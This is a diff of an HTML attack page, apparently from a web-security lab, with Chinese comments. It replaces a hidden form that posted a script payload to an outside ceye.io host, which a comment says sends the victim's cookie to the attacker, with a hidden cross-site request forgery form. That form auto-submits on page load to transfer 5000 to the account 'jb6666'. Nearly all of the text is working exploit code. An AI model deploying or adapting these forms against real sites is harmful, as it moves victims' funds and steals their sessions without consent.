@@ -7,16 +7,39 @@ window.onload = function() {
 </script>
 <!--页面加载后立即执行：点击触发表单提交执行ation跳转指定页面-->
 </head>
-<body>
-<form style='visibility:hidden' method="post" action="http://z432wk.ceye.io/">
-<!--隐藏表单，指定表单触发action转跳至可信网址-->
-    <input id="xssr_in" type="text" name="message" value=
-    "<script>
-document.location = 'test';
-	</script>"
-	 />
-	 <!--获取cookie并转递给攻击方进行处理-->
-    <input id="postsubmit" type="submit" name="submit" value="submit" />
-</form>
+<body>   
+                             <form style='visibility:hidden' action="transfer.php" method="post" enctype="multipart/form-data">
+                                    <div>
+                                        <label >对方用户名</label>
+                                        <div class="col-md-12">
+                                            <input type="text" name="target" value="jb6666">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label>转账金额</label>
+                                        <div>
+                                            <input type="text" name="money" value="5000">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="col-md-12">留言</label>
+                                        <div>
+                                            <textarea rows="5" name="messages" value="hh"></textarea>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label >转账方式</label>
+                                        <div >
+                                            <select >
+                                                <option>钱包</option>
+                                            </select>
+                                        </div>
+                                    </div>
+                                    <div >
+                                        <div >
+                                            <input id="postsubmit" type="submit"  value="转账">
+                                        </div>
+                                    </div>
+                                </form>
 </body>
 </html>
